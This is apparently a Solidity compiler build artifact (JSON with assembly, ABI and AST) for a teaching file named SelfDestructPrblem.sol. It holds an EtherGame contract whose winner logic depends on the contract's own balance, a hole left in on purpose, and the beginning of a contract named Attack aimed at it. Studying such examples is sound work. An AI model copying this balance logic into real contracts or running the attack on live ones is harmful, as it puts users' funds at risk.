											"source": -1
										},
										{
											"begin": 1916,
											"end": 1934,
											"name": "PUSH",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1916,
											"end": 1934,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1916,
											"end": 1934,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1909,
											"end": 1951,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1968,
											"end": 1986,
											"name": "PUSH",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1968,
											"end": 1986,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 322,
											"end": 370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1656,
											"end": 1992,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 322,
											"end": 370,
											"name": "tag",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 322,
											"end": 370,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 398,
											"end": 410,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 398,
											"end": 410,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 387,
											"end": 394,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 387,
											"end": 410,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 383,
											"end": 458,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 383,
											"end": 458,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 427,
											"end": 433,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 427,
											"end": 446,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 427,
											"end": 446,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 427,
											"end": 446,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 436,
											"end": 446,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 427,
											"end": 446,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 427,
											"end": 446,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 427,
											"end": 446,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 193,
											"end": 465,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 159,
											"end": 465,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"claimReward()": "b88a802f",
							"deposit()": "d0e30db0",
							"targetAmount()": "953b8fb8",
							"winner()": "dfbf53ae"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.13+commit.abaa5c0e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"claimReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"winner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/SelfDestructPrblem.sol\":\"EtherGame\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":199},\"remappings\":[]},\"sources\":{\"contracts/SelfDestructPrblem.sol\":{\"keccak256\":\"0x6d75d45d9b106b15ad3461617a9030699bb9cbd392d00932f2a335d9f6c20beb\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://bc00841f86b28ec54b70a53b4643d6897b3c79268d8ff2292445d5b761c691a5\",\"dweb:/ipfs/QmP6Qh8xQWGMeDQCStLhZQrXTZytcYu8M4ePfWATM4hQTw\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 4,
								"contract": "contracts/SelfDestructPrblem.sol:EtherGame",
								"label": "targetAmount",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 6,
								"contract": "contracts/SelfDestructPrblem.sol:EtherGame",
								"label": "winner",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/SelfDestructPrblem.sol": {
				"ast": {
					"absolutePath": "contracts/SelfDestructPrblem.sol",
					"exportedSymbols": {
						"Attack": [
							110
						],
						"EtherGame": [
							75
						]
					},
					"id": 111,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".2"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "EtherGame",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 75,
							"linearizedBaseContracts": [
								75
							],
							"name": "EtherGame",
							"nameLocation": "71:9:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "953b8fb8",
									"id": 4,
									"mutability": "mutable",
									"name": "targetAmount",
									"nameLocation": "100:12:0",
									"nodeType": "VariableDeclaration",
									"scope": 75,
									"src": "88:34:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "88:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "37",
										"id": 3,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "115:7:0",
										"subdenomination": "ether",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_7000000000000000000_by_1",
											"typeString": "int_const 7000000000000000000"
										},
										"value": "7"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "dfbf53ae",
									"id": 6,
									"mutability": "mutable",
									"name": "winner",
									"nameLocation": "144:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 75,
									"src": "129:21:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 5,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "129:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 42,
										"nodeType": "Block",
										"src": "193:272:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 13,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 10,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "212:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 11,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"src": "212:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"hexValue": "31",
																"id": 12,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "225:7:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000000_by_1",
																	"typeString": "int_const 1000000000000000000"
																},
																"value": "1"
															},
															"src": "212:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "596f752063616e206f6e6c792073656e642031204574686572",
															"id": 14,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "234:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_b2565c271bc1f6e9f3596c175513ca104086dfb78cd7419cc09c2779417406d9",
																"typeString": "literal_string \"You can only send 1 Ether\""
															},
															"value": "You can only send 1 Ether"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_b2565c271bc1f6e9f3596c175513ca104086dfb78cd7419cc09c2779417406d9",
																"typeString": "literal_string \"You can only send 1 Ether\""
															}
														],
														"id": 9,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "204:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 15,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "204:58:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 16,
												"nodeType": "ExpressionStatement",
												"src": "204:58:0"
											},
											{
												"assignments": [
													18
												],
												"declarations": [
													{
														"constant": false,
														"id": 18,
														"mutability": "mutable",
														"name": "balance",
														"nameLocation": "280:7:0",
														"nodeType": "VariableDeclaration",
														"scope": 42,
														"src": "275:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 17,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "275:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 24,
												"initialValue": {
													"expression": {
														"arguments": [
															{
																"id": 21,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967268,
																"src": "298:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_EtherGame_$75",
																	"typeString": "contract EtherGame"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_EtherGame_$75",
																	"typeString": "contract EtherGame"
																}
															],
															"id": 20,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "290:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 19,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "290:7:0",
																"typeDescriptions": {}
															}
														},
														"id": 22,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "290:13:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"id": 23,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "balance",
													"nodeType": "MemberAccess",
													"src": "290:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "275:36:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 28,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 26,
																"name": "balance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 18,
																"src": "330:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"id": 27,
																"name": "targetAmount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4,
																"src": "341:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "330:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "47616d65206973206f766572",
															"id": 29,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "355:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7f7f9c6d78507162a8bd16acc136c0b03c63c36f951fc71dd07575081ba76683",
																"typeString": "literal_string \"Game is over\""
															},
															"value": "Game is over"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_7f7f9c6d78507162a8bd16acc136c0b03c63c36f951fc71dd07575081ba76683",
																"typeString": "literal_string \"Game is over\""
															}
														],
														"id": 25,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "322:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 30,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "322:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 31,
												"nodeType": "ExpressionStatement",
												"src": "322:48:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 34,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 32,
														"name": "balance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "387:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 33,
														"name": "targetAmount",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4,
														"src": "398:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "387:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 41,
												"nodeType": "IfStatement",
												"src": "383:75:0",
												"trueBody": {
													"id": 40,
													"nodeType": "Block",
													"src": "412:46:0",
													"statements": [
														{
															"expression": {
																"id": 38,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 35,
																	"name": "winner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 6,
																	"src": "427:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"expression": {
																		"id": 36,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967281,
																		"src": "436:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 37,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"src": "436:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"src": "427:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 39,
															"nodeType": "ExpressionStatement",
															"src": "427:19:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "d0e30db0",
									"id": 43,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "deposit",
									"nameLocation": "168:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "175:2:0"
									},
									"returnParameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "193:0:0"
									},
									"scope": 75,
									"src": "159:306:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 73,
										"nodeType": "Block",
										"src": "503:188:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 50,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 47,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "522:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 48,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"src": "522:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"id": 49,
																"name": "winner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 6,
																"src": "536:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "522:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "4e6f742077696e6e6572",
															"id": 51,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "544:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_bdc864de34e46c040c4d730398f4acbd8b64d0b5023c3fd84e9cf74a6ae62165",
																"typeString": "literal_string \"Not winner\""
															},
															"value": "Not winner"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_bdc864de34e46c040c4d730398f4acbd8b64d0b5023c3fd84e9cf74a6ae62165",
																"typeString": "literal_string \"Not winner\""
															}
														],
														"id": 46,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "514:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 52,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "514:43:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 53,
												"nodeType": "ExpressionStatement",
												"src": "514:43:0"
											},
											{
												"assignments": [
													55,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 55,
														"mutability": "mutable",
														"name": "sent",
														"nameLocation": "576:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 73,
														"src": "571:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 54,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "571:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													},
													null
												],
												"id": 67,
												"initialValue": {
													"arguments": [
														{
															"hexValue": "",
															"id": 65,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "632:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"typeString": "literal_string \"\""
																}
															],
															"expression": {
																"expression": {
																	"id": 56,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "586:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 57,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"src": "586:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 58,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"src": "586:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 64,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"expression": {
																	"arguments": [
																		{
																			"id": 61,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "617:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_EtherGame_$75",
																				"typeString": "contract EtherGame"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_EtherGame_$75",
																				"typeString": "contract EtherGame"
																			}
																		],
																		"id": 60,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "609:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 59,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "609:7:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 62,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "609:13:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"id": 63,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "balance",
																"nodeType": "MemberAccess",
																"src": "609:21:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "586:45:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 66,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "586:49:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "570:65:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 69,
															"name": "sent",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 55,
															"src": "654:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "4661696c656420746f2073656e64204574686572",
															"id": 70,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "660:22:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb",
																"typeString": "literal_string \"Failed to send Ether\""
															},
															"value": "Failed to send Ether"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_445140255c9d889994129d349e64078d6f76b4b37ec896948f7e858f9b8a0dcb",
																"typeString": "literal_string \"Failed to send Ether\""
															}
														],
														"id": 68,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "646:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 71,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "646:37:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 72,
												"nodeType": "ExpressionStatement",
												"src": "646:37:0"
											}
										]
									},
									"functionSelector": "b88a802f",
									"id": 74,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "claimReward",
									"nameLocation": "482:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "493:2:0"
									},
									"returnParameters": {
										"id": 45,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "503:0:0"
									},
									"scope": 75,
									"src": "473:218:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 111,
							"src": "62:632:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Attack",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 110,
							"linearizedBaseContracts": [
								110
							],
							"name": "Attack",
							"nameLocation": "707:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 78,
									"mutability": "mutable",
									"name": "etherGame",
									"nameLocation": "731:9:0",
									"nodeType": "VariableDeclaration",
									"scope": 110,
									"src": "721:19:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_EtherGame_$75",
										"typeString": "contract EtherGame"
									},
									"typeName": {
										"id": 77,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 76,
											"name": "EtherGame",
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 75,
											"src": "721:9:0"
										},
										"referencedDeclaration": 75,
										"src": "721:9:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_EtherGame_$75",
											"typeString": "contract EtherGame"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 90,
										"nodeType": "Block",
										"src": "783:52:0",
										"statements": [
											{
												"expression": {
													"id": 88,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 84,
														"name": "etherGame",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 78,
														"src": "794:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_EtherGame_$75",
															"typeString": "contract EtherGame"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 86,
																"name": "_etherGame",
